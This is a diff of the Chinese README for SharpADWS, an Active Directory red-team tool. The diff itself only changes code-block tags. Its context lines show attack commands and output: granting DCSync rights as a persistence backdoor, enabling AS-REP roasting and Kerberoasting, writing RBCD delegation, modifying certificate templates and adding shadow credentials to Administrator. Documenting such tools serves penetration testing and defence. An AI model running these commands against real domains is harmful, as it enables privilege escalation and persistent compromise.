@@ -37,7 +37,7 @@ SharpADWS 实现了 [MS-ADDM](https://learn.microsoft.com/zh-cn/openspecs/window
 
 命令行参数 `-h` 可用于显示以下使用信息：
 
-```powershell
+```cmd
 C:\Users\Marcus>SharpADWS.exe -h
 
 SharpADWS 1.0.0-beta - Copyright (c) 2024 WHOAMI (whoamianony.top)
@@ -132,7 +132,7 @@ FindDelegation options:
 
 SharpADWS 在枚举 ACL 时，为了不对每个未知的受托者对象执行额外的 ADWS 请求，需要提前通过 cache method 创建所有账户对象的完整缓存并将其保存到文件中，从而避免产生大量（不必要的）流量。该缓存包含当前域内每个账户对象名称与其 objectSid 的映射。
 
-```powershell
+```cmd
 C:\Users\Marcus>SharpADWS.exe Cache
 
 [*] Cache file has been generated: object.cache
@@ -143,7 +143,7 @@ C:\Users\Marcus>SharpADWS.exe Cache
 
 Acl method 能够枚举指定 `-dn` 的对象的 DACL，并且支持通过 `-trustee`、`-right` 和 `-rid` 参数对枚举出的 DACL 进行筛选。比如，我们要枚举所有的 Domain Controller 对象，并筛选出受托者为 Marcus 的 DACL，如下所示：
 
-```powershell
+```cmd
 C:\Users\Marcus>SharpADWS.exe acl -dn "OU=Domain Controllers,DC=corp,DC=local" -scope Subtree -trustee Marcus
 
  Severity              : Critical
@@ -158,7 +158,7 @@ C:\Users\Marcus>SharpADWS.exe acl -dn "OU=Domain Controllers,DC=corp,DC=local" -
 
 又比如，我们要枚举所有的 User 对象，并筛选出权限为 GenericWrite，受托者的 RID 大于 1000 的 DACL，如下所示：
 
-```powershell
+```cmd
 C:\Users\Marcus>SharpADWS.exe acl -dn "CN=Users,DC=corp,DC=local" -scope Subtree -right Generic -rid 1000
 
  Severity              : Critical
@@ -173,7 +173,7 @@ C:\Users\Marcus>SharpADWS.exe acl -dn "CN=Users,DC=corp,DC=local" -scope Subtree
 
 此外，Acl method 还支持对特定对象的枚举：
 
-```powershell
+```cmd
 SharpADWS.exe -user                # Enumerate DACL for all user objects
 SharpADWS.exe -computer            # Enumerate DACL for all computer objects
 SharpADWS.exe -group               # Enumerate DACL for all group objects
@@ -188,7 +188,7 @@ SharpADWS.exe -gpo                 # Enumerate DACL for all gpo objects
 
 DCSync method 的 `list` 能够查询出所有被授予了 DS-Replication-Get-Changes、DS-Replication-Get-Changes-All 和 DS-Replication-Get-Changes-In-Filtered-Set 权限的账户，如下所示：
 
-```powershell
+```cmd
 C:\Users\Marcus>SharpADWS.exe DCSync -action list
 
  Severity              : Info
@@ -221,7 +221,7 @@ C:\Users\Marcus>SharpADWS.exe DCSync -action list
 
 此外，在拥有足够权限的情况下，您可以通过 `write` 为某个账户授予 DCSync 权限，以建立域持久性后门：
 
-```powershell
+```cmd
 C:\Users\Marcus>SharpADWS.exe DCSync -action write -target Marcus
 
 [*] Account Marcus now has DCSync privieges on the domain.
@@ -232,7 +232,7 @@ C:\Users\Marcus>SharpADWS.exe DCSync -action write -target Marcus
 
 DontReqPreAuth method 的 `list` 能够查找出所有设置了 “Do not require kerberos preauthentication” 选项的账户，如下所示：
 
-```powershell
+```cmd
 C:\Users\Marcus>SharpADWS.exe DontReqPreAuth -action list
 
 [*] Found users that do not require kerberos preauthentication:
@@ -244,7 +244,7 @@ C:\Users\Marcus>SharpADWS.exe DontReqPreAuth -action list
 
 此外，您可以滥用对目标账户 userAccountControl 属性的 WriteProperty 权限，通过  `write` 为该账户启用 “Do not require kerberos preauthentication”  选项，以执行 AS-REP Roasting 攻击：
 
-```powershell
+```cmd
 C:\Users\Marcus>SharpADWS.exe DontReqPreAuth -action write -target Administrator
 
 [*] Set DontReqPreAuth for user Administrator successfully!
@@ -255,7 +255,7 @@ C:\Users\Marcus>SharpADWS.exe DontReqPreAuth -action write -target Administrator
 
 Kerberoastable method 的 `list` 能够查找出所有设置了 SPN 的账户，如下所示：
 
-```powershell
+```cmd
 C:\Users\Marcus>SharpADWS.exe Kerberoastable -action list
 
 [*] Found kerberoastable users:
@@ -271,7 +271,7 @@ C:\Users\Marcus>SharpADWS.exe Kerberoastable -action list
 
 此外，您可以滥用对目标账户 servicePrincipalName 属性的 WriteProperty 权限，通过  `write` 为该账户（仅限于用户账户）添加一个 SPN，以执行 Kerberoasting 攻击：
 
-```powershell
+```cmd
 C:\Users\Marcus>SharpADWS.exe Kerberoastable -action write -target Administrator
 
 [*] Kerberoast user Administrator successfully!
@@ -282,7 +282,7 @@ C:\Users\Marcus>SharpADWS.exe Kerberoastable -action write -target Administrator
 
 AddComputer method 允许您在 ms-DS-MachineAccountQuota 属性值限制的范围内创建一个新的计算机账户，该极其账户可用于后续的 RBCD 攻击中使用。
 
-```powershell
+```cmd
 C:\Users\Marcus>SharpADWS.exe AddComputer -computer-name PENTEST$ -computer-pass Passw0rd
 
 [*] Successfully added machine account PENTEST$ with password Passw0rd.
@@ -293,7 +293,7 @@ C:\Users\Marcus>SharpADWS.exe AddComputer -computer-name PENTEST$ -computer-pass
 
 RBCD method 的 `read` 能够读取指定账户对象的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性值，以检查谁有权限对该账户进行资源委派，如下所示：
 
-```powershell
+```cmd
 C:\Users\Marcus>SharpADWS.exe RBCD -action read -delegate-to DC01$
 
 [*] Accounts allowed to act on behalf of other identity:
@@ -305,7 +305,7 @@ C:\Users\Marcus>SharpADWS.exe RBCD -action read -delegate-to DC01$
 
 RBCD method 的 `write` 能够写入目标账户对象的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性，以进行 Resource-Based Constrained Delegation 攻击。如下所示，我们首先用 AddComputer method 创建了一个新的极其账户 `PENTEST$`，然后我们可以执行以下命令，将 `PENTEST$` 的 SID 写入 `DC01$` 的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性中：
 
-```powershell
+```cmd
 C:\Users\Marcus>SharpADWS.exe RBCD -action write -delegate-to DC01$ -delegate-from PENTEST$
 
 [*] Delegation rights modified successfully!
@@ -317,7 +317,7 @@ C:\Users\Marcus>SharpADWS.exe RBCD -action write -delegate-to DC01$ -delegate-fr
 
 此外，通过 `remove` 可以将 `write` 中添加的 SID 从目标对象的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性中移除：
 
-```powershell
+```cmd
 C:\Users\Marcus>SharpADWS.exe RBCD -action remove -delegate-to DC01$ -delegate-from PENTEST$
 
 [*] Delegation rights modified successfully!
@@ -330,7 +330,7 @@ C:\Users\Marcus>SharpADWS.exe RBCD -action remove -delegate-to DC01$ -delegate-f
 
 Certify method 的 `find` 能够像 [Certify](https://github.com/GhostPack/Certify) 一样枚举 ADCS 中的数据，包括所有的证书颁发机构和证书模版：
 
-```powershell
+```cmd
 C:\Users\Marcus>SharpADWS.exe Certify -action find
 
 [*] Find CA and certificate templates
@@ -431,7 +431,7 @@ C:\Users\Marcus>SharpADWS.exe Certify -action find
 
 此外， `find` 支持 `-enrolleeSuppliesSubject` 和 `-clientAuth` 选项，能够筛选出所有开启了 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 标志和支持 Client Authentication 的证书模版：
 
-```powershell
+```cmd
 C:\Users\Marcus>SharpADWS.exe Certify -action find -enrolleeSuppliesSubject -clientAuth
 
 [*] Find CA and certificate templates
@@ -477,7 +477,7 @@ C:\Users\Marcus>SharpADWS.exe Certify -action find -enrolleeSuppliesSubject -cli
 
 Certify method 的 `modify` 允许您在拥有对目标模版的写入权限下，修改证书模版的属性，例如开启 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 标志或启用 Client Authentication：
 
-```powershell
+```cmd
 C:\Users\Marcus>SharpADWS.exe Certify -action modify -template User -enrolleeSuppliesSubject -clientAuth
 
 [*] Enable enrollee supplies subject for template User successfully!
@@ -491,7 +491,7 @@ Whisker method 能够像 [Whisker](https://github.com/eladshamir/Whisker) 一样
 
 Whisker method 的 `list` 能够列出目标账户对象的 `msDS-KeyCredentialLink` 属性值：
 
-```powershell
+```cmd
 C:\Users\Marcus>SharpADWS.exe Whisker -action list -target DC01$
 
 [*] List deviced for DC01$:
@@ -503,7 +503,7 @@ C:\Users\Marcus>SharpADWS.exe Whisker -action list -target DC01$
 
 Whisker method 的 `add` 允许您在拥有写入权限的情况下，为目标账户的 `msDS-KeyCredentialLink` 属性添加一个 Key，以执行 ShadowCredentials 攻击：
 
-```powershell
+```cmd
 C:\Users\Marcus>SharpADWS.exe Whisker -action add -target Administrator -cert-pass Passw0rd
 
 [*] Certificate generaged
@@ -560,7 +560,7 @@ C:\Users\Marcus>SharpADWS.exe Whisker -action add -target Administrator -cert-pa
 
 此外，通过 `remove`，您可以提供 `-device-id` 将指定的 Key 从目标对象的 `msDS-KeyCredentialLink` 属性中移除：
 
-```powershell
+```cmd
 C:\Users\Marcus>SharpADWS.exe Whisker -action remove -target DC01$ -device-id c9fdae6b-f6a1-4880-a498-6dc89814e596
 
 [*] Found value to remove
@@ -573,7 +573,7 @@ C:\Users\Marcus>SharpADWS.exe Whisker -action remove -target DC01$ -device-id c9
 
 FindDelegation method 能够枚举出当前域内所有的委派关系，该 method 没有多余的选项或参数：
 
-```powershell
+```cmd
 C:\Users\Marcus\desktop>SharpADWS.exe FindDelegation
 
 AccountName  AccountType  DelegationType                      DelegationRightsTo
